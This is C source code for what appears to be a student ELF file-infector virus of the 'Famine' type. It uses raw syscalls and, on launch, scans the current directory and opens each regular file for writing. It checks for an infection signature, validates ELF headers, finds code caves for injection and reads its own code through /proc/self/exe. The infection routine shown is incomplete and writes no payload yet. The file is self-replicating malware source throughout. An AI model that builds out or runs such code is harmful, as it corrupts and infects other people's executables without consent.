#include "sys/types.h"
#include <stdint.h>
#include <stdio.h>
__attribute__((always_inline)) inline long
sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
    long ret;
    register long r10 __asm__("r10") = arg4;
    register long r8 __asm__("r8") = arg5;
    register long r9 __asm__("r9") = arg6;
    __asm__ volatile("syscall" : "=a"(ret) : "a"(n), "D"(arg1), "S"(arg2), "d"(arg3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
    return ret;
}

#include "syscall.h"
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <stddef.h>
#include <sys/syscall.h>
static int high(int n, int high);
static int get_digits(int n);
static void calculate(volatile char *res, int *n, int size, int *i);

__attribute__((always_inline)) inline int
ft_strlen(volatile char *str) {
    int i = 0;
    while (str[i] != '\0')
        i++;
    return (i);
}
__attribute__((always_inline)) inline void prints_str_nl(volatile char *str);
__attribute__((always_inline)) inline void
ft_itoa(int n, volatile char *str) {
    int i;
    int size;
    char *res;

    i = 0;
    if (n == 0) {
        str[0] = '0';
        str[1] = '\0';
        return;
    }
    size = get_digits(n);
    if (n < 0) {
        n *= -1;
        size++;
        i++;
        str[0] = '-';
    }
    while (i < size)
        calculate(&str[i], &n, size, &i);
    return;
}

__attribute__((always_inline)) inline static int
high(int n, int high) {
    int res;

    res = 1;
    while (high--)
        res = res * n;
    return (res);
}

__attribute__((always_inline)) inline static int
get_digits(int n) {
    int i;

    i = 0;
    while (n) {
        n = n / 10;
        i++;
    }
    return (i);
}

__attribute__((always_inline)) inline static void
calculate(volatile char *res, int *n, int size, int *i) {
    *res = *n / (high(10, size - *i - 1)) + '0';
    *n = *n % high(10, size - *i - 1);
    *i = *i + 1;
}

__attribute__((always_inline)) inline void
print_number_nl(int num) {
    volatile char temp[100];
    for (int i = 0; i < 100; i++)
        temp[i] = 0;
    ft_itoa(num, temp);
    prints_str_nl(temp);
}
typedef struct file {
    void *mem;
    uint64_t size;
} file;

typedef struct linux_dirent64 {
    uint64_t d_ino;          /* 64-bit inode number */
    uint64_t d_off;          /* Not an offset; see getdents() */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char d_type;    /* File type */
    char d_name[];           /* Filename (null-terminated) */
} dirent64;

__attribute__((always_inline)) inline void
ft_exit(int exit_code) {
    sys(SYS_exit, exit_code, 0, 0, 0, 0, 0);
}
__attribute__((always_inline)) inline int
ft_write(int fd, volatile void *ptr, size_t size) {
    return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
}
__attribute__((always_inline)) inline void
prints_str_nl(volatile char *str) {
    ft_write(1, str, ft_strlen(str));
    char nl = '\n';
    ft_write(1, &nl, 1);
}
__attribute__((always_inline)) inline int
ft_read(int fd, volatile void *ptr, size_t size) {
    return sys(SYS_read, fd, (long)ptr, size, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_lseek(int fd, off_t offset, int whence) {
    return sys(SYS_lseek, fd, (long)offset, whence, 0, 0, 0);
}

__attribute__((always_inline)) inline void
ft_print_one() {
    char a = '1';
    char b = '\n';
    ft_write(1, &a, 1);
    ft_write(1, &b, 1);
}
__attribute__((always_inline)) inline void
ft_print_zero() {
    char a = '0';
    char b = '\n';
    ft_write(1, &a, 1);
    ft_write(1, &b, 1);
}

#include <sys/mman.h>
__attribute__((always_inline)) inline uint64_t
ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
    return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
}

__attribute__((always_inline)) inline void *
ft_malloc(uint64_t size) {
    return (void *)ft_mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

__attribute__((always_inline)) inline int
ft_open(volatile char *path, volatile int flags, volatile mode_t mode) {
    return sys(SYS_open, (long)path, flags, mode, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_getdents64(int fd, char dirp[], size_t count) {
    return sys(SYS_getdents64, fd, (long)dirp, count, 0, 0, 0);
}

__attribute__((always_inline)) inline void
file_mmap(int fd, volatile file *file) {
    int off = ft_lseek(fd, 0, SEEK_END);
    file->size = off;

    off = ft_lseek(fd, 0, SEEK_SET);

    file->mem = (void *)ft_mmap(0, file->size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
}

__attribute__((always_inline)) inline int
ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
    const uint64_t NEEDLE_SIZE = ft_strlen(needle);
    int i = 0;
    int j;

    while ((i + NEEDLE_SIZE) < size) {
        j = 0;
        while ((i + j) < (size)) {
            char c = '\n';
            ft_write(100, haystack + i + j, 1);
            ft_write(100, &c, 1);
            ft_write(100, needle + j, 1);
            ft_write(100, &c, 1);
            if (haystack[i + j] != needle[j]) break;
            if (j == (NEEDLE_SIZE - 1)) {
                // j and i are 0 here
                return (1);
            }
            j++;
        }
        i++;
    }
    return (0);
}

__attribute__((always_inline)) inline int
ft_string_search_fd(int fd, volatile char *needle) {
    const uint64_t BUF_SIZE_WITHOUT_OVERLAP = 1000;
    const uint64_t NEEDLE_SIZE = ft_strlen(needle);
    const uint64_t BUF_SIZE = BUF_SIZE_WITHOUT_OVERLAP + NEEDLE_SIZE;

    char buf[BUF_SIZE];

    int bytes_read;
    do {
        bytes_read = ft_read(fd, buf, BUF_SIZE);
        if (bytes_read < 0) return (0);
        if (ft_strstr(buf, needle, bytes_read)) return (1);
        ft_lseek(fd, -NEEDLE_SIZE, SEEK_CUR);
    } while (bytes_read > NEEDLE_SIZE);

    return 0;
}

__attribute__((always_inline)) inline void
proc_fill(volatile char *c) {
    c[0] = '/';
    c[1] = 'p';
    c[2] = 'r';
    c[3] = 'o';
    c[4] = 'c';
    c[5] = '/';
    c[6] = 's';
    c[7] = 'e';

    c[8] = 'l';
    c[9] = 'f';
    c[10] = '/';
    c[11] = 'e';
    c[12] = 'x';
    c[13] = 'e';
    c[14] = '\0';
}

__attribute__((always_inline)) inline void
signature_fill(volatile char *buf) {
    buf[0] = 'f';
    buf[1] = 'a';
    buf[2] = 'm';
    buf[3] = 'i';
    buf[4] = 'n';
    buf[5] = 'e';
    buf[6] = ' ';
    buf[7] = 'a';
    buf[8] = 'b';
    buf[9] = 'i';
    buf[10] = 'e';
    buf[11] = 'd';
    buf[12] = '-';
    buf[13] = 'c';
    buf[14] = 'h';
    buf[15] = ' ';
    buf[16] = 'f';
    buf[17] = 'b';
    buf[18] = 'r';
    buf[19] = 'u';
    buf[20] = 'g';
    buf[21] = 'g';
    buf[22] = 'e';
    buf[23] = 'm';
    buf[24] = '\0';
}

typedef struct code_cave {
    uint64_t start;
    uint64_t size;
} code_cave;

__attribute__((always_inline)) inline Elf64_Shdr *
get_next_section_header(uint64_t section_cur_end, file file) {
    Elf64_Ehdr *header = file.mem;
    Elf64_Shdr *section_header_table = file.mem + header->e_shoff;

    Elf64_Shdr *section_header_next = NULL;

    for (int i = 0; i < header->e_shnum; i++) {
        Elf64_Shdr *sh = file.mem + header->e_shoff + (header->e_shentsize * i);

        if (sh->sh_offset >= section_cur_end) {
            if (section_header_next == NULL)
                section_header_next = sh;
            else if (section_header_next->sh_offset > sh->sh_offset)
                section_header_next = sh;
        }
    }
    return section_header_next;
}

__attribute__((always_inline)) inline int
code_caves_get(volatile code_cave code_caves[], volatile file *file) {
    Elf64_Shdr *section_header = NULL;
    Elf64_Ehdr *header = file->mem;
    uint64_t section_cur_end = header->e_phoff + header->e_phentsize * header->e_phnum;
    uint64_t section_old_end = 0;
    int i = 0;
    do {
        section_old_end = section_cur_end;
        section_header = get_next_section_header(section_cur_end, *file);
        if (section_header != NULL)
            section_cur_end = section_header->sh_offset + section_header->sh_size;
        else {
            if (!(section_old_end <= header->e_shoff && file->size >= header->e_shoff + header->e_shnum * header->e_shentsize)) {

                code_caves[i].start = section_old_end;
                code_caves[i].size = file->size - section_old_end;

                i++;
            }
            return i;
        }

        if (section_old_end != section_header->sh_offset && section_header->sh_offset - section_old_end > 16) {
            if (!(section_old_end <= header->e_shoff && section_header->sh_offset >= header->e_shoff + header->e_shnum * header->e_shentsize)) {

                code_caves[i].start = section_old_end;
                code_caves[i].size = section_header->sh_offset - section_old_end;
                i++;
            }
        }
    } while (section_header != NULL);
    return i;
}

__attribute__((always_inline)) inline int
elf64_ident_check(volatile const Elf64_Ehdr *header) {

    if (header->e_ident[EI_MAG0] != ELFMAG0) return 1;
    if (header->e_ident[EI_MAG1] != ELFMAG1) return 1;
    if (header->e_ident[EI_MAG2] != ELFMAG2) return 1;
    if (header->e_ident[EI_MAG3] != ELFMAG3) return 1;

    if (header->e_ident[EI_CLASS] != ELFCLASS64) return 2;

    if (header->e_ident[EI_DATA] == ELFDATANONE) return 3;

    if (header->e_ident[EI_VERSION] != EV_CURRENT) return 4;

    for (size_t i = EI_PAD; i < sizeof(header->e_ident); i++) {
        if (header->e_ident[i] != 0) return 5;
    }
    return 0;
}

__attribute__((always_inline)) inline uint64_t
e_entry_to_entry_offset(volatile file *file, volatile uint64_t e_entry) {
    Elf64_Ehdr *header = file->mem;

    Elf64_Phdr *program_header_table = file->mem + header->e_phoff;

    for (int i = 0; i < header->e_shnum; i++) {
        Elf64_Phdr *ph = program_header_table + i;
        if (e_entry >= ph->p_vaddr && e_entry < ph->p_vaddr + ph->p_memsz) return (e_entry + ph->p_offset) - ph->p_vaddr;
    }

    return 0;
}
__attribute__((always_inline)) inline int
infect_file(char *path) {
    int fd = ft_open(path, O_RDWR, 0);
    if (fd < 0) return (1);

    volatile char signature[30];
    signature_fill(signature);

    const uint8_t has_signature = ft_string_search_fd(fd, signature);

    if (has_signature) return (0);

    ft_lseek(fd, 0, SEEK_SET);

    volatile Elf64_Ehdr header;
    ft_read(fd, &header, sizeof(Elf64_Ehdr));

    if (elf64_ident_check(&header)) return 0;

    volatile code_cave code_caves[100];

    prints_str_nl(path);
    volatile file file;
    file_mmap(fd, &file);
    int num = code_caves_get(code_caves, &file);
    // for (int i = 0; i < num; i++)
    //     printf("code start: 0x%lx - size 0x%lx\n", code_caves[i].start, code_caves[i].size);

    // -----------------------------------------------------------
    volatile char proc_path[15];
    proc_fill(proc_path);
    int fd_self = ft_open(proc_path, O_RDONLY, 0);
    if (fd < 0) return (1);

    ft_read(fd_self, &header, sizeof(Elf64_Ehdr));
    file_mmap(fd_self, &file);
    uint64_t builder_start = e_entry_to_entry_offset(&file, header.e_entry);
    uint64_t builder_size = 0xea;

    ft_lseek(fd_self, builder_start + builder_size - 8, SEEK_SET);

    uint64_t scaffold_table_start;
    ft_read(fd_self, &scaffold_table_start, sizeof(scaffold_table_start));
    print_number_nl(builder_start);
    // -----------------------------------------------------------
    return (0);
}

__attribute__((always_inline)) inline int
infect_dir(char *path) {
    int fd = ft_open(path, O_RDONLY, O_DIRECTORY);

    const uint64_t FILE_NAME_MAX = 255;
    const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
    const uint64_t ALINMENT = 8;
    const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;

    char dirp[DIR_P_SIZE];
    int bytes_read = 0;
    do {
        bytes_read = ft_getdents64(fd, dirp, DIR_P_SIZE);
        if (bytes_read < 0) return (1);

        dirent64 *dirent_cur = (dirent64 *)dirp;
        while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
            if (dirent_cur->d_type == DT_REG) infect_file(dirent_cur->d_name);
            dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
        }
    } while (bytes_read > 0);

    return (0);
}

#ifdef TESTING
int
main(void) {
#else
void
_start() {
#endif /* ifdef TESTING */
    char path[2];
    path[0] = '.';
    path[1] = '\0';

    infect_dir(path);
    ft_exit(0);
}
